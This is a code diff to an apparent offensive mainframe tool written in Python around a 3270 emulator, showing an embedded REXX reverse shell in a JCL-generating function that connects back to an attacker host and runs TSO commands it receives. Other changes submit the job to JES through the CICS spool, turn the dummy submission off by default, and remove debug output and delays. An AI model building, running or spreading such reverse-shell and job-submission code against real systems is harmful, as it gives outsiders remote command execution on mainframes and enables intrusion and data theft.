@@ -12,7 +12,7 @@ from py3270wrapper import WrappedEmulator
 import signal
 import argparse 
 
-TRAN_NUMBER = 500
+TRAN_NUMBER = 1000
 SLEEP = 0.5
 AUTHENTICATED = False
 DO_AUTHENT = False
@@ -589,13 +589,15 @@ def jcl_creator(lhost, username="CICSUSER"):
     parse var t socket_rc s . ;
     if socket_rc <> 0 then do
        t= SOCKET('TERMINATE');exit 1;end
-    t=Socket('SETSOCKOPT',s,'SOL_SOCKET','SO_KEEPALIVE','ON')
-    t=SOCKET('SETSOCKOPT',s,'SOL_SOCKET','SO_ASCII','On')
+       par1='SOL_SOCKET';
+t=Socket('SETSOCKOPT',s,par1,'SO_KEEPALIVE','ON')
+t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On')
     t=SOCKET('SOCKETSETSTATUS','CLIENT')
     t=SOCKET('CONNECT',s,'AF_INET' rport rhost)
     t= SOCKET('SEND',s, 'Shell> ')
   DO FOREVER
-  g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;return 0
+g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end
+return 0
  close_socket:
     parse arg exito .
     te = SOCKET('CLOSE',s); exit;return 0
@@ -605,11 +607,11 @@ def jcl_creator(lhost, username="CICSUSER"):
     parse var sox s_rc s_type s_port s_ip s_results;
     parse var sox s_rc s_data_len s_data_text;
     if s_rc <> 0 then do CALL close_socket(1);end
-    c = DELSTR(s_data_text, LENGTH(s_data_text)); return c;
+c = DELSTR(s_data_text,LENGTH(s_data_text));return c;
   INLIST: procedure
      arg sock, socklist; do i=1 to words(socklist)
-       if words(socklist) = 0 then return 0
-       if sock = word(socklist,i) then return 1;end;return 0
+    if words(socklist) = 0 then return 0
+if sock = word(socklist,i) then return 1;end;return 0
  current_user:
    text = nl||'userID: '||userid()||nl; return text
  exec_tso:
@@ -619,12 +621,12 @@ def jcl_creator(lhost, username="CICSUSER"):
    u = OUTTRAP(OFF);DO i = 1 to tso_out.0
       text = text||tso_out.i||nl;end;return text
  exec_cmd:
- parse arg sockID, do_it; parse var do_it do_it do_commands
+ parse arg sockID, do_it; parse var do_it do_it do_co
  SELECT
   WHEN do_it = 'getuid' THEN DO
-    te=SOCKET('SEND',sockID, current_user()||nl); end
+    te=SOCKET('SEND',sockID, current_user()||nl);end
   WHEN do_it = 'tso' | do_it = 'execute' THEN do
-   t=SOCKET('SEND',sockID, exec_tso(do_commands)||nl);end
+   t=SOCKET('SEND',sockID, exec_tso(do_co)||nl);end
   WHEN do_it = 'exit' THEN DO
     call close_socket '1';exit;end;end
  te = SOCKET('SEND',sockID, 'Shell> ');return 1;
@@ -687,7 +689,7 @@ def open_spool():
         
     data = em.screen_get()
     for d in data:
-        print d
+        #print d
         token = None
         if "Token( '" in d:
             pos = d.find("Token( '")+len("Token( '")
@@ -716,13 +718,14 @@ def spool_write(token, jcl):
         request = "&SQLKHDS  +00080"
         em.safe_send(request);
         em.send_enter();
-        sleep()
+        #sleep()
         
+               
         em.move_to(7,24)
         em.safe_send(j);        
         em.send_enter();
-        sleep()
-        #show_screen();
+        #sleep()
+        
         
         # back to the normal screen
         em.send_enter();
@@ -732,7 +735,7 @@ def spool_write(token, jcl):
         em.send_enter();  
         em.send_enter();
         
-        show_screen();  
+        #show_screen();  
         
         i += 1
         data = em.screen_get();
@@ -757,7 +760,7 @@ def close_spool():
             sys.exit();
     whine('JOB submitted successfully to JES','good',1)
     
-def submit_job(lhost, dummy = True):
+def submit_job(lhost, dummy=False):
     #if (set_mixedCase(em)==-1):
     #    sys.exit();
     if results.jcl:
